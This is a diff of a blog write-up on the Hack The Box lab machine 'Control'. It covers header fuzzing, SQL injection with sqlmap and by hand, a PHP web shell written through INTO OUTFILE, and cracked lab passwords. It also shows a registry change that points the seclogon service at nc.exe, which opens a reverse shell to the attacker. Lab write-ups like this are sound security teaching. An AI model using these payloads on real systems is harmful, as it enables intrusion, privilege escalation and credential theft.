@@ -4,7 +4,27 @@ draft: false
 tags:
   - htb
   - windows
+  - sqli
+  - sqlmap
+  - http-header
+  - wfuzz
+  - sqli-shell
+  - powershell
+  - credential-object
+  - invoke-command
+  - powershell-history
+  - get-acl
+  - acl
+  - sddl
 ---
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/Control.png)
+
+Control was by far one of the hardest box I've ever done. It starts with bypassing restriction to **admin.php** by bruteforcing HTTP Headers using wFuzz. From there, I've exploited SQL vulnerability to obtain password hashes for multiple users and spawn PHP reverse shell. For privilege escalation 1, I cracked the password hash found from earlier and used it to create Powershell credential object, which is then used to spawn shell as the elevated user privilege. For obtaining Administrator privilege, I discovered Powershell History file which leads me to rewriting registry keys for the vulnerable services, which will spawn me a shell as the system. 
+
+Privilege Escalation from user **Hector** to **Administrator** was really painful since it required lot of Powershell scripting. I ended up following the Walkthrough listed at the references below. 
+
+
+
 ## Information Gathering
 ### Rustscan
 
@@ -89,7 +109,7 @@ Source code has an interesting hidden information on it:
 
 `/admin.php` shows **Access Denied**, saying Header is missing and I have to go through the proxy to access the page:
 
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-3.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-2.png)
 
 #### Directory Bruteforce
 Before trying to bypass **admin.php** restriction, I will first directory bruteforce using Feroxbuster:
@@ -122,9 +142,9 @@ I will first bruteforce headers with host IP address:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-6.png)
 
-It seems like **Access Denied** page had the size of 89.
+It seems like **Access Denied** page has the size of 89 chars.
 
-This time, I will filter out headers with size of 89:
+This time, I will filter out headers with size of 89 chars:
 
 `wfuzz -c -w headers.txt -u http://10.10.10.167/admin.php -H "FUZZ: 10.10.10.167" --hh 89`
 
@@ -199,7 +219,7 @@ Now I will list tables in **mysql** database:
 
 **user** table looks interesting to me. 
 
-I will move on to dump **user** table from **mysql** database:
+I will move on to dumping **user** table from **mysql** database:
 
 `sqlmap -r search-product-req.txt --dbs --batch -p productName -D mysql -T user --dump`
 
@@ -214,7 +234,7 @@ I will move on to dump **user** table from **mysql** database:
 
 It discovers bunch of password hashes and password for user **manager** is cracked: **l3tm3!n**
 
-I will try spawning **os-shell** just in case it works:
+I will try spawning **os-shell** just in case and it works:
 
 `sqlmap -r search-product-req.txt --dbs --batch -p productName --os-shell`
 
@@ -227,7 +247,7 @@ I would have to spawn a reverse shell through manual sql injection not using SQL
 
 ### Manual SQli
 
-Although using tools such as sqlmap is convenient, it is best practice to understand what is going on when you run a tool. I can manually conduct SQLi without SQLmap as well. 
+Although using tools such as **sqlmap** is convenient, it is best practice to understand what is going on when you run a tool. I can manually conduct SQLi without SQLmap as well. 
 
 
 #### Identify Number of Columns
@@ -256,7 +276,7 @@ Using the command below, I can query current database and user which is **wareho
 
 #### List Database
 
-I can list database using the command below: **information_schema**, **mysql**, **warehouse**
+I can list databases using the command below: **information_schema**, **mysql**, **warehouse**
 
 `productName=Asus USB-AC53 Nano' UNION SELECT group_concat(schema_name),2,3,4,5,6 from information_schema.schemata;-- -`
 
@@ -287,9 +307,6 @@ I can read specific column fom the table as such:
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-28.png)
 
 
-
-
-
 ### SQLi Shell
 
 Using [this article](https://null-byte.wonderhowto.com/how-to/use-sql-injection-run-os-commands-get-shell-0191405/), I will be able to spawn a shell using SQL injection. 
@@ -297,7 +314,6 @@ Using [this article](https://null-byte.wonderhowto.com/how-to/use-sql-injection-
 I will first upload PHP cmd shell to `C:/inetpub/wwwroot/` as **cmd.php**:
 
 `productName=Asus USB-AC53 Nano' UNION SELECT '<?php system($_GET["cmd"]); ?>',2,3,4,5,6 into outfile 'c:/inetpub/wwwroot/cmd.php';-- -`
-
 
 I can confirm RCE working using curl as such:
 
@@ -307,7 +323,7 @@ I can confirm RCE working using curl as such:
 
 Now in order to spawn reverse shell, I will first transfer **nc.exe** over using smbserver.
 
-Prepare smbserver on directory with **nc.exex**:
+Run impacket-smbserver on directory with **nc.exe**:
 
 `impacket-smbserver share $(pwd) -smb2support`
 
@@ -329,7 +345,6 @@ Running **nc.exe** towards my local Kali lister, now I have shell as **nt author
 
 ## Privesc: iusr to Hector
 ### PowerUp.ps1
-
 
 I will first start powershell session through `powershell` command and download **PowerUp.ps1**:
 
@@ -381,14 +396,15 @@ I will be able to execute commands as hector using powershell but I will need he
 
 ### Password Crack
 
-Using crackstation I can crack password hash for hector: **l33th4x0rhector**
+Remembering password hash discovered from SQLi earlier, I will use crackstation to crack it: **l33th4x0rhector**
 
-picture here
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/control-crack.png)
 
 ### Run command as Hector
 
-After starting Powershell using `powershell`, I will create credential object:
+Now that I have password for user **Hector**, I will be able to run command as hector.
 
+After starting Powershell using `powershell`, I will create credential object:
 
 ```powershell
 $SecPassword = ConvertTo-SecureString 'l33th4x0rhector' -AsPlainText -Force
@@ -401,7 +417,7 @@ Now using powershell's cmdlet **Invoke-Command** and credential object, I can ru
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-43.png)
 
-### Shel as hector
+### Shell as hector
 
 Now that I can run commands as hector, I will once again try to spawn a reverse shell. 
 
@@ -424,6 +440,8 @@ I have a reverse shell connection as hector:
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-46.png)
 
 ## Privesc: Hector to Administrator
+
+Privilege escalation from Hector to Administrator was very overwhelming. I ended up following other's write-ups in the end. I recommend to check out other's write-ups if mine is not clear enough. 
 ### WinPEAS
 **WinPEAS.exe** finds PS history file under `C:\Users\Hector\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\`:
 
@@ -461,32 +479,8 @@ These PowerShell commands are used for interacting with the Windows Registry and
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-49.png)
 
-```powershell
-Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet
-Owner  : BUILTIN\Administrators
-Group  : NT AUTHORITY\SYSTEM
-Access : BUILTIN\Administrators Allow  FullControl
-         NT AUTHORITY\Authenticated Users Allow  ReadKey
-         NT AUTHORITY\Authenticated Users Allow  -2147483648
-         S-1-5-32-549 Allow  ReadKey
-         S-1-5-32-549 Allow  -2147483648
-         BUILTIN\Administrators Allow  FullControl
-         BUILTIN\Administrators Allow  268435456
-         NT AUTHORITY\SYSTEM Allow  FullControl
-         NT AUTHORITY\SYSTEM Allow  268435456
-         CREATOR OWNER Allow  268435456
-         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
-         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -2147483648
-         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  
-         ReadKey
-         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  
-         -2147483648
-Audit  : 
-Sddl   : O:BAG:SYD:AI(A;;KA;;;BA)(A;ID;KR;;;AU)(A;CIIOID;GR;;;AU)(A;ID;KR;;;SO)(A;CIIOID;GR;;;SO)(A;ID;KA;;;BA)(A;CIIOI
-         D;GA;;;BA)(A;ID;KA;;;SY)(A;CIIOID;GA;;;SY)(A;CIIOID;GA;;;CO)(A;ID;KR;;;AC)(A;CIIOID;GR;;;AC)(A;ID;KR;;;S-1-15-
-         3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)(A;CIIOID;GR;;;S
-         -1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)
-```
+There's **Audit Sddl** at the end of the command output and it is impossible to read. I will have to decrypt it to make it readable.
+
 ### Insecure ACLs abuse
 #### Decrypt Sddl
 
@@ -501,7 +495,7 @@ ConvertFrom-SddlString -Sddl $acl.Sddl | Foreach-Object {$_.DiscretionaryAcl}
 
 Since the above is still not very pretty to read, I organized it below:
 
-```bash
+```c
 NT AUTHORITY\Authenticated Users: AccessAllowed (ExecuteKey, ListDirectory, ReadExtendedAttributes, ReadPermissions, WriteExtendedAttributes)
 
 NT AUTHORITY\SYSTEM: AccessAllowed (ChangePermissions, CreateDirectories, Delete, ExecuteKey, FullControl, GenericExecute, GenericWrite, ListDirectory, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, WriteData, WriteExtendedAttributes, WriteKey)
@@ -513,7 +507,7 @@ CONTROL\Hector: AccessAllowed (ChangePermissions, CreateDirectories, Delete, Exe
 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES: AccessAllowed (ExecuteKey, ListDirectory, ReadExtendedAttributes, ReadPermissions, WriteExtendedAttributes)
 ```
 
-It seems like **Hector** got Full control over ACL. 
+It seems like **Hector** got lot of rights towards editing services. 
 
 #### Exploitation
 
@@ -525,11 +519,15 @@ In order to get RCE as the system, I would need the following:
 - I need to start and stop the service as Hector
 - Serice is already configured to run as the LocalSystem
 
+Command below, will save all the services under **HKLM:\System\CurrentControlSet\Services** to variables **$services**: 
+
 ```powershell
 $services = Get-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\*
 ```
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-53.png)
+
+Command below will filter **LocalSystem** owned services from variable **$services**:
 
 ```powershell
 $services | Where-Object { ($_.ObjectName -match 'LocalSystem') }
@@ -537,12 +535,15 @@ $services | Where-Object { ($_.ObjectName -match 'LocalSystem') }
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-54.png)
 
+Command below will will filter **LocalSystem** owned services that user Hector can start from the variable **$services**:
 
 ```powershell
 $services | Where-Object { ($_.ObjectName -match 'LocalSystem') -and ($_.Start -eq '3') }
 ```
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-55.png)
+
+I will save $services to $fs and filter out only **pschildname** from it as such:
 
 ```powershell
 $fs = $services | Where-Object { ($_.ObjectName -match 'LocalSystem') -and ($_.Start -eq '3') }
@@ -554,12 +555,19 @@ $names = $fs.pschildname
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-56.png)
 
+Among all the services that satisfies my requirement, **seclogon** seems to be a good candidate:
+
+`sc query seclogon`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-61.png)
 
-reg query HKLM\System\CurrentControlSet\Services\seclogon
+I can retrieve registry information regarding **seclogon** as such:
+
+`reg query HKLM\System\CurrentControlSet\Services\seclogon`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-62.png)
+
+I’ll change the ImagePath of the service so it runs my netcat as SYSTEM.
 
 ```powershell
 reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\seclogon" /t REG_EXPAND_SZ /v ImagePath /d "c:\windows\system32\spool\drivers\color\nc.exe 10.10.14.21 9002 -e cmd.exe" /f
@@ -567,7 +575,11 @@ reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\seclogon" /t REG_E
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-63.png)
 
+I'll start **seclogon** using `sc start seclogon`:
+
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-64.png)
+
+Now I have shell as the system on my local listener:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/control/image-65.png)
 
@@ -579,3 +591,4 @@ reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\seclogon" /t REG_E
 - https://null-byte.wonderhowto.com/how-to/use-sql-injection-run-os-commands-get-shell-0191405/
 - https://www.stationx.net/powershell-cheat-sheet/
 - https://mostwanted002.gitlab.io/post/htb-control-writeup/
+- https://snowscan.io/htb-writeup-control/#
